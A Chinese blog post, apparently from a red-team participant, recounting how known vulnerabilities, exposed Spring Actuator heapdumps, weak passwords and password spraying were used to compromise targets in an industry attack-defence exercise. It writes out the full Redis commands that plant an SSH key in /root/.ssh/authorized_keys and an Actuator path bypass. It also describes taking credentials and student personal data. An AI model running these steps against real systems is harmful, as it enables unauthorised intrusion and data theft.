#  【攻防实战】某行业hw-如何利用nday拿下n个靶标   
原创 胡图图  攻防实战指南   2024-05-29 16:27  
  
**点击上方蓝字关注我们**  
  
  
原创声明  
  
本文由[  
攻防实战指南]原创，版权所有。未经本公众号书面授权，禁止任何形式的转载、摘编、复制或建立镜像。如需转载，请联系我们，违反上述声明者，我们将依法追究其法律责任  
。  
  
  
  
# 【序言】  
  
    
上个月参加了某行业  
HW，由于时间紧任务重，直接拿着  
13页靶标就开始怼，在项目实施中，利用  
nday拿下多个靶标，不出意外是第一，因为时间上的小插曲最后拿了第二，接下来简单分享下：  
  
  
一、  
**某靶标NC bsh.servlet.BshServlet RCE**  
  
  
信息收集发现某靶标存在  
bsh.servlet.BshServle RCE  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjNg3a92RfAknLqLicjcib68W6fcOk5OdaPDpjhjKfR2icSagRLeKgn6BUA/640?wx_fmt=png&from=appmsg "")  
  
  
经典  
windows  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjUDiaN2TObdLaQfXZc1AiajoPd4dAaKTN2W52aayFGqqSiah7XAPBWZRiaQ/640?wx_fmt=png&from=appmsg "")  
  
  
直接注入内存马：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjDHDVR2MfCiakPCqllTNgtfDiarX6EzZGcbcicy1bZ5ibkWa22qZlX9nIiag/640?wx_fmt=png&from=appmsg "")  
  
  
本地信息收集发现  
mysql数据库：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjU0RoBibCPNWX7U0lJLraVkicBTiaTBhV6Mj8EWOpZ3YNvrwA9EyvyUA7A/640?wx_fmt=png&from=appmsg "")  
  
  
由于表数据过于敏感因此不再展示且存在大量数据，发现目标管理员企业邮箱口令：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjhbiaS7y0AQwiaP3j8gpzx7o8eSy4BESgUA1dEWQiaj72VTBdFNtLeEvOQ/640?wx_fmt=png&from=appmsg "")  
  
  
登录发现大量报单数据：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjwDaWCYgEJ0UU9sohR8pIylm854gH10aS0RpONhiagnbdqE72A7mVAQA/640?wx_fmt=png&from=appmsg "")  
  
  
同时找到大量用户密码，直接构造账户密码本：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASje1UlD2ay0n0ficiay059FE1JKGymRvPcSY2m7H1KGgCc03vPTJYQw0jg/640?wx_fmt=png&from=appmsg "")  
  
  
使用密码本在内网进行喷洒，发现本机管理员密码是其中之一且爆破出来  
ssh密码：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj3aOF0WibzOhHU366n7L1shOgVflPbNVRE0hjXk2SCOVpeUOJk7umGdg/640?wx_fmt=png&from=appmsg "")  
  
  
在三台  
linux主机上进行主机信息收集，主要寻找  
history文件，其中一台部署了  
web服务，疑似官网靶标，直接在官网目录下写文件：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjGurRLwiccnaMc1Ff86PGFxVlozibsR4qnUHCLE5Hu7VByLJaZU9sa7uQ/640?wx_fmt=png&from=appmsg "")  
  
拿下官网，该公司为重点靶标  
+拿下官网，直接上大分；  
  
  
**二、**  
**Actuator未授权-常规渗透手法[垃圾手法]**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjRQZ71fGplPT9B8icsEwacaEkOlyEsBPVk2X1JTTeibPQoElFVoYe5dPg/640?wx_fmt=png&from=appmsg "")  
  
  
遇到这种路径我都会扫一下  
spring的一些路径，果不其然发现了  
actuator未授权，重点只关注能拿  
shell的几个接口、  
heapdump、一些日志接口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjRIm0oickOQFnHoludlV2scUwS8DFj9o2yIy4Oc1buAhA6IqmlLnib5Dg/640?wx_fmt=png&from=appmsg "")  
  
  
直接看  
heapdump，整理后发现  
mysql数据库  
,里面包含大量运行数据  
:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjN1SARDxIibMsnkm7qpmgnuDNJcUbZNiaBQFya1E8bqGYHiastAhibfHkVQ/640?wx_fmt=png&from=appmsg "")  
  
  
ftp口令、网站管理员口令、  
druid口令、  
ossaksk：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjCrdJQAk1hAN2PjTcktej7BlI9he4gwHFIibBAK7tiaK8obNibnTvBdnTQ/640?wx_fmt=png&from=appmsg "")  
  
  
**三**、  
**靶标弱口令[垃圾手法]**  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjOK58GiamWic0P2oqqL29pHWfGCH4Oh4OYzmOicP1YfLvaR07uYNyd5mEg/640?wx_fmt=png&from=appmsg "")  
  
  
某学校教务系统管理员存在弱口令，admin/123456；  
  
一个班班累计48条学生姓名。电话，亲属电话，家庭地址，粗略估计100个班级左右，泄露5000条+  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjQQJ0j0Nz7QRbXTsyaPQHzX45VhfxDbzlINlfEpPkcteWhfsGvVFMtA/640?wx_fmt=png&from=appmsg "")  
  
四、  
**弱口令+RCE**  
  
  
某高校教材管理系统存在弱口令，直接固定密码用户名枚举，喷洒出来两个口令，但是后台没有上传点，可以看到这是个老系统：  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj3USX2IIOtz5TYVia6j15tsCrzPnFTcicjuKILv1icyckpR5Ziavv5FSfdg/640?wx_fmt=png&from=appmsg "")  
  
    
扫描同  
IP下其他资产发现  
druid弱口令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjj8WhJWsLicV2mf2BwG5OQ6FbBPacicklRFtNe6bHicAicDzurCg0BgIxqw/640?wx_fmt=png&from=appmsg "")  
  
  
  把  
durid后台所有接口抓出来发现存在一个登录口：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjdZ58ElI9ibhkBib9aY4grEWofTxT0iatI9G5FbkyRhbBa216qouVloxTg/640?wx_fmt=png&from=appmsg "")  
  
  
  很像若依哈，跑一下是否存在：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjf3o4iaLYMsXW2UefwibrkWWpeNNMC5rLAqmHB4pCwWWZbCYPYdJLznaA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjUicWiaOF6OgNc7ebsEm76MkiaKxia3pajJticJYic100r9LlK9BibKAXAibGAw/640?wx_fmt=png&from=appmsg "")  
  
  这个站不让打内网；  
  
  
五、  
**jeecg-boot rce漏洞**  
  
  
某靶标存在  
jeecg-boot漏洞:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjRiaiatRqos4MwoWIDoJo59wcUfEoP8KicTMlibAMpXP2CBxRIZCRxc5EBA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjmTDhfjg6zHI8JQwib655En9tLeic1t7TJZKl72EkkVjicXn0FEZyVT9hQ/640?wx_fmt=png&from=appmsg "")  
  
前台登录口在  
bp中发现  
jeecg的字样，网上测试了几个洞发现都存在，找个能直接拿  
shell的  
queryFieldBySql-rce  
漏洞  
：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj8XMicibAsiaYKSVribLfgSgH1ZIcJAicxqpYsPWichVxpNsT8fgz56NY7jHw/640?wx_fmt=png&from=appmsg "")  
  
  
直接打内存马：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjE6BxDLdKSdvCYX05YgR7CFDNgLpbacaBTicFIsXEOavvYiaw4ptos7QQ/640?wx_fmt=png&from=appmsg "")  
  
  
这个内网只有一台机器，就没有必要再看了；  
  
  
六、  
actuator绕过+逻辑漏洞  
  
  
依旧是靶标，存在  
actuator未授权但是使用了绕过  
/..;/..;/env:  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjz6ZQ0DGdmknFLQLPz9TpuiczlOP10vFtPXpJLgUYyym5HEz8KFZQAyg/640?wx_fmt=png&from=appmsg "")  
  
  
路径下存在  
T  
race  
接口泄漏部分员工  
session：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjtKTrZsLTt552bLUBCp3F0pyRUYT2Xj2GGohLl77lSKiccwd7lYicRYHQ/640?wx_fmt=png&from=appmsg "")  
  
  
拿着这个  
session拼接到前端登录可进入后台，发现可操作大量设备：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjPoGPRDczCxXibafeicTkuoJdXOico96viaT7E3wErHzNgNlFZBTKhLH23w/640?wx_fmt=png&from=appmsg "")  
  
  
七、  
**某指挥系统存在任意命令执行**  
  
  
依旧是靶标，前段时间爆出来的  
0day没来得及修：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjK1LaD8562sp6AbicNZics9D7OOElic9kOkGDan8YKJ7JricRt8TlPPzDmA/640?wx_fmt=png&from=appmsg "")  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjWCwbpJw2k2IW8BmON3IbQq5CHHDJiaMRSVbZhhBwSAmJskAjib0Fq8Wg/640?wx_fmt=png&from=appmsg "")  
  
直接上一句话木马：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjyicnFdukxdvB8zmJeaaACdbiaekuYDBN2A9Y1QKa5yoTY94ytaIazBtA/640?wx_fmt=png&from=appmsg "")  
  
信息收集还没完就关站了  
。  
  
  
八、  
**actuator未授权+redisgetshell**  
  
  
依旧是靶标下某个目录发现actuator文件，直接下载heapdump  
  
发现存在redis、mysql口令：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj4F5ytEFhqVqBPmEE1PvoqYeEFTVoFQ6OOFLDxxudiaIQuaiaTTvAr31A/640?wx_fmt=png&from=appmsg "")  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj7NqichzUTHKeUGTsgAlsuzA9HrZXHd5hzfNoYyVKsBQW3rweIMZDLTw/640?wx_fmt=png&from=appmsg "")  
  
  
连接  
mysql数据库发现各类账号密码  
,对拿权限没用就没看  
:  
  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj18ElJQhSB2xE5JSun7yrzwiaibeqjAuAvKfPUn8lsSE8Ozia4lJX2VhDA/640?wx_fmt=png&from=appmsg "")  
  
尝试  
redis写公钥：  
  
1.启动  
vps：  
```
ssh-keygen -t rsa
cd /root/.ssh/
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASj2DLibNq3bDQpEIYWU6gtBbfxhsuDhLdSObiaXzcDib5SwA2sfxvdUav9g/640?wx_fmt=png&from=appmsg "")  
  
  
将公钥写入  
txt：  
```
(echo -e "\n\n"; cat id_rsa.pub;echo -e "\n\n") > key.txt
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjV4WZe7bqDG4mib4uZd7ufFaoE6RpicYibVQkXBkpyJd0icPeJBVYicxhw9Q/640?wx_fmt=png&from=appmsg "")  
```
cat key.txt | redis-cli -h 666 --pass 666 -x set xx
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjb5ZuWKU8ZADKoqpicEy3KxVD7KEC5VpzF6Bwwicnibav7pDohK0YkGqMA/640?wx_fmt=png&from=appmsg "")  
  
检验是否成功：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjalGWict68He5ZltcOK9eGLB6nVKNrAoP9l3nLYqZbRBTlH0y5S3q3Ow/640?wx_fmt=png&from=appmsg "")  
  
```
config set dir /root/.ssh
config set dbfilename authorized_keys
save
```  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjicHrBOmjc86zpjicFBJkxia2CPazrlxnzQib0NeIX1nKfBxibll66hr7cUg/640?wx_fmt=png&from=appmsg "")  
```
ssh -i id_rsa root@6660
```  
  
连接：  
  
![](https://mmbiz.qpic.cn/sz_mmbiz_png/CsyjOZ96XiaeOrBdlRibkRPicP7hv6bxASjP5gPzUiaic4Tooukh4IqbVJzJTx0cBIXJzzu1nWicvSI9CzNxABibDGE7w/640?wx_fmt=png&from=appmsg "")  
  
  
这个站拿下了宿主机里面跑了很多容器服务可直接拿权限，客户依旧不让打内网。  
# 【后言】  
  
   总的来看这个行业  
hw还是挺简单，由于时间紧没有深入细究，直接照着靶标扫了一遍，深度利用肯定有很多东西，可以看到文章中都是常规手法，主要还是不断提升自己的经验，拓展攻击面。  
  
  
  
版权声明  
  
     本公众号所发布的文章仅代表作者个人观点，不代表本公众号立场。文章中的内容、图片、视频等资料，未经许可，不得用于商业用途。  
  
     转载或引用本公众号内容时，需注明来源，并保留本公众号的版权信息。  
  
     对于侵犯本公众号版权的行为，我们将保留采取法律手段追究的权利。  
  
免责声明  
  
     本公众号提供的信息仅供参考，不构成任何形式的投资建议或专业意见。我们不对因使用本公众号内容而产生的任何损失承担责任。  
  
  
